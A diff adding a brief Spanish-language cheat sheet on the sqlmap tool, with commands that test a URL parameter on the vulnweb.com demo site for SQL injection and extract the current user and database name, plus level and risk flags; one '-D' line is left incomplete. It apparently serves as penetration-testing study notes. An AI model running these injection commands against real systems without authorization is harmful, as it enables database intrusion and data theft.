@@ -1,0 +1,21 @@
+## SQLMap
+
+sqlmap -h 
+  h = help 
+
+sqlmap -r test.txt
+  r = Para poder ingresar un archivo con la intercepcion 
+
+sqlmap -u http://testasp.vulnweb.com/showforum.asp?id=1 -p id                                # Hacer el testeo
+  u = Es la url 
+  p = Parametro de testeo
+
+sqlmap -u http://testasp.vulnweb.com/showforum.asp?id=1 -p id --current-user                 # Extrar datos 
+  current-user = Extraer el nombre del usuario actual  
+
+sqlmap -u http://testasp.vulnweb.com/showforum.asp?id=1 -p id --current-db
+  current-db = Extraer el nombre de la base de datos 
+
+sqlmap -u http://testasp.vulnweb.com/showforum.asp?id=1 -p id -D 
+  --level=LEVEL (Nivel de testeo 1-5, default 1)
+  --risk=RISK (Nivel de riesgo de testeo 1-3, default 1)
